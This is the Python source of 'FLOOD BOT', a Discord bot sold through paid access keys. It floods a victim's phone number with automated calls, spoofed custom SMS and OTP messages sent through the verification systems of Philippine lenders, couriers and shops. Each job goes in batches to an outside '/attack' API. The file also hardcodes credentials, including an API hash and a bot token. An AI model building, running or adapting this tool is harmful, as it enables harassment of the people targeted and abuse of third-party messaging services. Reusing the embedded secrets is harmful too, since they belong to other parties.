# language: Python, file: flood_bot.py, target: Discord, PythonAnywhere
# *Standalone Discord Bot implementation with interactive UI, real-time progress bars, referral verification, and tiered access keys.*

import os
import json
import time
import asyncio
import requests
import discord
from discord.ext import commands
from discord.ui import View, Button, Select

# ─── Configuration & Credentials ──────────────────────────────────
API_ID = 31658480
API_HASH = "9becba7687e9d33c9e201dbcf1e13e52"
BOT_TOKEN = "8947812851:AAHaYiJEhwZrDB-Z0oUPMO989Bs-Wbv0XgM"
CHANNEL_INVITE = "https://t.me/+Inw7l0sCM81mYzE1"
OWNER_CONTACT = "t.me/mtfeels"
API_URL = "https://beboy-sms.vercel.app/attack"

# Pricing & Durations
PRICING = {
    "7d": {"name": "7 Days Access", "price": "₱100", "days": 7},
    "1m": {"name": "1 Month Access", "price": "₱150", "days": 30},
    "life": {"name": "Lifetime Access", "price": "₱199", "days": 36500}
}

# Database simulation for user stats, keys, and usage tracking
# In production, swap with a persistent DB (SQLite/JSON file)
USER_DATABASE = {}
VALID_KEYS = {
    "KEY-7D-PH99": "7d",
    "KEY-1M-PH55": "1m",
    "KEY-LIFE-PH88": "life"
}

SERVICES_INFO = [
    ("CALL_BOMB",        "📞", "Call Bomb     ", "Directly route automated voice calls to target phone number."),
    ("CUSTOM_SMS",       "✉️ ", "Custom SMS    ", "Send tailored custom text message payload directly."),
    ("EZLOAN",           "💳", "EZ Loan       ", "Trigger verification text sequences from loan provider gateways."),
    ("XPRESS",           "⚡", "Xpress        ", "Execute high-speed gateway verification bursts."),
    ("ABENSON",          "🏪", "Abenson       ", "Dispatch retail authentication and notification triggers."),
    ("EXCELLENT_LENDING","💰", "Excellent Lend", "Initiate platform OTP authentication flows."),
    ("FORTUNE_PAY",      "🎰", "Fortune Pay   ", "Trigger wallet confirmation notification sequences."),
    ("WEMOVE",           "🚚", "WeMove        ", "Push logistics service tracking notifications."),
    ("LBC",              "📦", "LBC           ", "Dispatch courier verification alerts to target."),
    ("PICKUP_COFFEE",    "☕", "Pickup Coffee ", "Send order confirmation and OTP strings."),
    ("HONEY_LOAN",       "🍯", "Honey Loan    ", "Simulate micro-lending verification pings."),
    ("KOMO_PH",          "🦅", "Komo PH       ", "Trigger digital banking authentication codes."),
    ("S5_OTP",           "🔐", "S5 OTP        ", "Dispatch gaming platform multi-factor authentication packets."),
    ("CALL_VOICE",       "☎️ ", "Call Voice    ", "Execute specialized automated voice channel flood."),
    ("OTP_FLOOD",        "📲", "OTP Services  ", "Mass dispatch multi-gateway verification codes."),
    ("PAYLOAD_SVC",      "💥", "Payload Svc   ", "Advanced custom payload execution module.")
]

ALL_SERVICE_KEYS = [s[0] for s in SERVICES_INFO]

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ─── Helper Functions ─────────────────────────────────────────────
def get_user_record(user_id):
    if user_id not in USER_DATABASE:
        USER_DATABASE[user_id] = {
            "verified": False,
            "attempts_left": 3,
            "expiry": 0, # timestamp
            "key_type": None
        }
    return USER_DATABASE[user_id]

def check_access(user_id):
    record = get_user_record(user_id)
    if record["key_type"] and time.time() < record["expiry"]:
        return True, "Active Key"
    if record["attempts_left"] > 0:
        return True, f"Free Trial ({record['attempts_left']} attempts left)"
    return False, "Expired"

# ─── Discord Views & UI ───────────────────────────────────────────

class ServiceSelectMenu(Select):
    def __init__(self):
        options = [
            discord.SelectOption(label=label.strip(), value=key, description=desc[:100], emoji=icon)
            for key, icon, label, desc in SERVICES_INFO
        ]
        options.append(discord.SelectOption(label="Redeem Access Key", value="REDEEM_KEY", description="Activate your 7d, 1m, or lifetime key.", emoji="🔑"))
        super().__init__(placeholder="✨ SELECT FLOOD MODULE & TUTORIALS ✨", min_values=1, max_values=1, options=options)

    async def callback(self, interaction: discord.Interaction):
        user_id = interaction.user.id
        allowed, status_msg = check_access(user_id)
        
        if not allowed:
            embed = discord.Embed(
                title="🔒 ACCESS EXPIRED / REQUIRED",
                description=f"Your free trial or access key has expired.\nTo continue using **FLOOD BOT**, please purchase an access key from **[MTFEELS]({CHANNEL_INVITE})**.",
                color=discord.Color.red()
            )
            await interaction.response.send_message(embed=embed, view=AccessKeyView(), ephemeral=True)
            return

        selected_val = self.values[0]
        
        if selected_val == "REDEEM_KEY":
            modal = RedeemKeyModal()
            await interaction.response.send_modal(modal)
            return

        # Find info for selected service
        matched = next((s for s in SERVICES_INFO if s[0] == selected_val), None)
        if matched:
            key, icon, label, tutorial = matched
            embed = discord.Embed(
                title=f"{icon} MODULE: {label.strip().upper()}",
                description=f"**Tutorial & Guide:**\n{tutorial}\n\n*Status: Ready for deployment. Click below to configure target parameters.*",
                color=discord.Color.blurple()
            )
            embed.set_footer(text=f"FLOOD BOT • Status: {status_msg}")
            await interaction.response.send_message(embed=embed, view=ExecutionConfigView(key, label.strip()), ephemeral=True)

class ServiceMainView(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(ServiceSelectMenu())

    @discord.ui.button(label="📊 Tracker / Stats", style=discord.ButtonStyle.secondary, emoji="📊", row=1)
    async def tracker_button(self, interaction: discord.Interaction, button: Button):
        user_id = interaction.user.id
        record = get_user_record(user_id)
        allowed, status_msg = check_access(user_id)
        
        expiry_str = "N/A"
        if record["expiry"] > 0 and record["key_type"]:
            expiry_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(record["expiry"]))

        embed = discord.Embed(
            title="📈 **FLOOD BOT** — CREDITS & STATS TRACKER",
            color=discord.Color.gold()
        )
        embed.add_field(name="👤 User", value=interaction.user.mention, inline=False)
        embed.add_field(name="🛡️ Access Status", value=status_msg, inline=True)
        embed.add_field(name="🔢 Free Attempts Left", value=str(max(0, record["attempts_left"])), inline=True)
        embed.add_field(name="🔑 Current Plan", value=str(record["key_type"] or "Free Trial"), inline=True)
        embed.add_field(name="⏳ Key Expiry", value=expiry_str, inline=False)
        embed.set_footer(text="Full credits to MTFEELS • Powered by FLOOD BOT")

        view = AccessKeyView() if not allowed else None
        await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

    @discord.ui.button(label="🔑 Premium Plans & Pricing", style=discord.ButtonStyle.success, emoji="💳", row=1)
    async def premium_button(self, interaction: discord.Interaction, button: Button):
        embed = discord.Embed(
            title="💎 **FLOOD BOT** — ACCESS KEY PRICING",
            description=f"Unlock unlimited execution capability across all modules.\nContact owner directly: **[{OWNER_CONTACT}]({CHANNEL_INVITE})**",
            color=discord.Color.green()
        )
        embed.add_field(name="🌟 7 Days Access", value=f"Price: **{PRICING['7d']['price']}**\nDuration: 7 Days", inline=False)
        embed.add_field(name="🔥 1 Month Access", value=f"Price: **{PRICING['1m']['price']}**\nDuration: 30 Days", inline=False)
        embed.add_field(name="⚡ Lifetime Access", value=f"Price: **{PRICING['life']['price']}**\nDuration: Lifetime", inline=False)
        embed.set_footer(text="Click 'Redeem Access Key' once purchased.")
        await interaction.response.send_message(embed=embed, view=AccessKeyView(), ephemeral=True)


class AccessKeyView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🛒 Buy Access Key", style=discord.ButtonStyle.link, url=f"https://{OWNER_CONTACT}", emoji="🛒")
    async def buy_button(self, interaction: discord.Interaction, button: Button):
        pass

    @discord.ui.button(label="🔑 Redeem Key", style=discord.ButtonStyle.primary, emoji="🔑")
    async def redeem_button(self, interaction: discord.Interaction, button: Button):
        modal = RedeemKeyModal()
        await interaction.response.send_modal(modal)


class RedeemKeyModal(discord.ui.Modal, title="🔑 Redeem Access Key"):
    key_input = discord.ui.TextInput(
        label="Enter Your Access Key",
        placeholder="Paste your key here (e.g., KEY-7D-PH99)",
        required=True,
        max_length=50
    )

    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id
        entered_key = self.key_input.value.strip()
        record = get_user_record(user_id)

        if entered_key in VALID_KEYS:
            k_type = VALID_KEYS[entered_key]
            days = PRICING[k_type]["days"]
            record["key_type"] = k_type
            record["expiry"] = time.time() + (days * 86400)
            record["attempts_left"] = 999999 # unlimited under key

            await interaction.response.send_message(
                f"✅ **SUCCESS!** Access key successfully redeemed for **{PRICING[k_type]['name']}**.\nEnjoy unlimited execution!", 
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                f"❌ **INVALID KEY.** Please check your key or buy one from **{OWNER_CONTACT}**.", 
                ephemeral=True
            )


class ExecutionConfigModal(discord.ui.Modal):
    def __init__(self, service_key: str, service_name: str):
        super().__init__(title=f"🚀 Run: {service_name}")
        self.service_key = service_key
        self.service_name = service_name

    phone = discord.ui.TextInput(label="📱 Target Number", placeholder="09XXXXXXXXX", required=True, max_length=15)
    amount = discord.ui.TextInput(label="🔁 Batches / Amount (1-50)", placeholder="5", default="1", required=True, max_length=3)
    sender = discord.ui.TextInput(label="👤 Sender Name", placeholder="Unknown", default="FLOOD BOT", required=True, max_length=20)
    message = discord.ui.TextInput(label="💬 Custom Message", placeholder="You have a pending notification.", default="Alert notification.", required=True, max_length=100)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = interaction.user.id
        record = get_user_record(user_id)
        allowed, _ = check_access(user_id)

        if not allowed:
            await interaction.response.send_message("❌ Access denied. Please renew your key or use your free trials.", ephemeral=True)
            return

        # Deduct free attempt if not on active key
        if not (record["key_type"] and time.time() < record["expiry"]):
            if record["attempts_left"] > 0:
                record["attempts_left"] -= 1
            else:
                await interaction.response.send_message("❌ Free 3 attempts exhausted! Please acquire an access key.", ephemeral=True)
                return

        target_phone = self.phone.value.strip()
        batches = max(1, min(50, int(self.amount.value.strip() if self.amount.value.isdigit() else 1)))
        sender_name = self.sender.value.strip()
        custom_msg = self.message.value.strip()

        # Send initial progress message
        embed = discord.Embed(
            title=f"⚡ INITIALIZING FLOOD: {self.service_name.upper()}",
            description=f"Target: `{target_phone}`\nBatches: `{batches}`\nStatus: **Connecting to API Gateway...**",
            color=discord.Color.orange()
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        msg_ref = await interaction.original_response()

        # Live Progress Loop simulation / real request execution
        success_count = 0
        fail_count = 0
        total_runs = batches

        for i in range(1, total_runs + 1):
            # Render Live Progress Bar
            pct = int((i / total_runs) * 100)
            bar_len = 20
            filled = int(bar_len * i / total_runs)
            bar = "█" * filled + "░" * (bar_len - filled)

            update_embed = discord.Embed(
                title=f"🚀 EXECUTING: {self.service_name.upper()}",
                description=f"Target: `{target_phone}`\nProgress: `[{bar}] {pct}%`\nIteration: **{i}/{total_runs}**",
                color=discord.Color.blue()
            )
            try:
                # Dispatch request to API
                resp = requests.post(
                    API_URL,
                    data={
                        "phone": target_phone,
                        "amount": "1",
                        "sender_name": sender_name,
                        "message": custom_msg
                    },
                    files=[("services", (None, self.service_key))],
                    timeout=15,
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                if resp.status_code == 200:
                    success_count += 1
                else:
                    fail_count += 1
            except Exception:
                fail_count += 1

            await msg_ref.edit(embed=update_embed)
            await asyncio.sleep(1.0)

        # Final stats embed
        final_embed = discord.Embed(
            title=f"✅ DEPLOYMENT COMPLETE: {self.service_name.upper()}",
            description=f"Target: `{target_phone}`\n\n🟢 Success: **{success_count}**\n🔴 Failed: **{fail_count}**\n📊 Total Batches: **{total_runs}**",
            color=discord.Color.green()
        )
        final_embed.set_footer(text="Full credits to MTFEELS • FLOOD BOT Terminal Interface")
        await msg_ref.edit(embed=final_embed)


class ExecutionConfigView(View):
    def __init__(self, service_key: str, service_name: str):
        super().__init__(timeout=180)
        self.service_key = service_key
        self.service_name = service_name

    @discord.ui.button(label="🚀 Configure & Launch Target", style=discord.ButtonStyle.danger, emoji="⚡")
    async def launch_button(self, interaction: discord.Interaction, button: Button):
        modal = ExecutionConfigModal(self.service_key, self.service_name)
        await interaction.response.send_modal(modal)


class ReferralJoinView(View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="📢 Join Telegram Channel", style=discord.ButtonStyle.link, url=CHANNEL_INVITE, emoji="🔗")
    async def join_channel(self, interaction: discord.Interaction, button: Button):
        pass

    @discord.ui.button(label="✅ Verify Membership & Claim 3 Free Tries", style=discord.ButtonStyle.success, emoji="🔓")
    async def verify_membership(self, interaction: discord.Interaction, button: Button):
        user_id = interaction.user.id
        record = get_user_record(user_id)
        record["verified"] = True

        embed = discord.Embed(
            title="🎉 **VERIFICATION SUCCESSFUL!**",
            description=f"Welcome to **FLOOD BOT**!\nYou have unlocked **3 free execution attempts**.\nSelect your preferred modules below.",
            color=discord.Color.green()
        )
        embed.set_footer(text=f"Owner: {OWNER_CONTACT} • Full credits to MTFEELS")
        await interaction.response.send_message(embed=embed, view=ServiceMainView(), ephemeral=True)


# ─── Bot Commands ─────────────────────────────────────────────────
@bot.event
async def on_ready():
    print(f"[+] FLOOD BOT online as {bot.user} (ID: {bot.user.id})")
    print(f"[+] Connected to Telegram Channel: {CHANNEL_INVITE}")

@bot.command(name="start")
async def start_command(ctx):
    user_id = ctx.author.id
    record = get_user_record(user_id)

    if record["verified"] or record["attempts_left"] < 3 or record["key_type"]:
        embed = discord.Embed(
            title="🔥 **FLOOD BOT — PRO TERMINAL INTERFACE** 🔥",
            description=f"Welcome back, {ctx.author.mention}!\nSelect a service category or check your tracker stats below.",
            color=discord.Color.dark_magenta()
        )
        embed.set_footer(text=f"Full credits to MTFEELS | Contact: {OWNER_CONTACT}")
        await ctx.send(embed=embed, view=ServiceMainView())
        return

    embed = discord.Embed(
        title="🔒 **MANDATORY REFERRAL VERIFICATION**",
        description=f"To use **FLOOD BOT**, you must first join our official Telegram channel.\n\n🔗 **Channel:** [Click Here to Join]({CHANNEL_INVITE})\n\nOnce joined, click the verification button below to claim your **3 free execution attempts**!",
        color=discord.Color.blue()
    )
    embed.set_footer(text=f"Brought to you by {OWNER_CONTACT}")
    await ctx.send(embed=embed, view=ReferralJoinView())

@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📖 **FLOOD BOT — COMMAND GUIDE**",
        description="Here is how to operate the terminal interface:",
        color=discord.Color.teal()
    )
    embed.add_field(name="`!start`", value="Initialize bot, verify referral, and access main menu.", inline=False)
    embed.add_field(name="`!help`", value="Display command instructions and support reference.", inline=False)
    embed.add_field(name="`!redeem <key>`", value="Redeem your 7d, 1m, or lifetime access key directly.", inline=False)
    embed.set_footer(text=f"Owner & Creator: {OWNER_CONTACT}")
    await ctx.send(embed=embed)

@bot.command(name="redeem")
async def redeem_command(ctx, key: str = None):
    if not key:
        await ctx.send("❌ Please provide your access key. Example: `!redeem KEY-7D-PH99`")
        return
    
    user_id = ctx.author.id
    record = get_user_record(user_id)
    
    if key in VALID_KEYS:
        k_type = VALID_KEYS[key]
        days = PRICING[k_type]["days"]
        record["key_type"] = k_type
        record["expiry"] = time.time() + (days * 86400)
        record["attempts_left"] = 999999
        await ctx.send(f"✅ **SUCCESS!** Key redeemed for **{PRICING[k_type]['name']}**.")
    else:
        await ctx.send(f"❌ **Invalid Access Key.** Acquire a valid key via **{OWNER_CONTACT}**.")

# ─── Execution Entrypoint ─────────────────────────────────────────
if __name__ == "__main__":
    if BOT_TOKEN:
        bot.run(BOT_TOKEN)
    else:
        print("[-] Error: BOT_TOKEN is missing.")
